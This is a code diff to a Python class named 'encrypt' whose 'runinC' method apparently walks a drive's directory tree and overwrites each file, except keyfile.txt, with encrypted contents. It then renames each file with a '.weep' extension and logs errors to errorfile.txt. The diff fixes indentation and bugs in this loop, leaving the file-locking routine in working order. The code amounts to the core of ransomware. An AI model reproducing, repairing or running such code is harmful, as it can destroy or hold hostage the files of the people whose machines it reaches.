@@ -72,7 +72,7 @@ class encrypt(object):
                                 writemode ='a'
                             else:
                                 writemode ='w'
-                            with open('errorfile.txt',writemode,encoding='utf-8'):
+                            with open('errorfile.txt',writemode,encoding='utf-8') as f:
                                 f.write(str(exception))
                                 f.write('\n')
     def runinC(self):
@@ -88,22 +88,22 @@ class encrypt(object):
             #     for name in files:
             #         f.write(os.path.join(root,name)+'\n')
             for name in files:
-                    if name!='keyfile.txt':
-                        walkingdir = os.path.join(root,name)
-                        #   use try block here with with block
-                        try:
-                            with open(walkingdir,'rb+') as f:
-                                data = f.read()
-                                f.seek(0)
-                                f.truncate()
-                                f.write(self.encrypt(data))
-                            os.rename(walkingdir,walkingdir+'.weep')
-                        except Exception as exception:
-                            if os.path.exists('errorfile.txt'):
-                                writemode ='a'
+                if name!='keyfile.txt':
+                    walkingdir = os.path.join(root,name)
+                    #   use try block here with with block
+                    try:
+                        with open(walkingdir,'rb+') as f:
+                            data = f.read()
+                            f.seek(0)
+                            f.truncate()
+                            f.write(self.encrypt(data))
+                        os.rename(walkingdir,walkingdir+'.weep')
+                    except Exception as exception:
+                        if os.path.exists('errorfile.txt'):
+                            writemode ='a'
                         else:
-                                writemode ='w'
-                        with open('errorfile.txt',writemode,encoding='utf-8'):
+                            writemode ='w'
+                        with open('errorfile.txt',writemode,encoding='utf-8') as f:
                             f.write(str(exception))
                             f.write('\n')
     @staticmethod
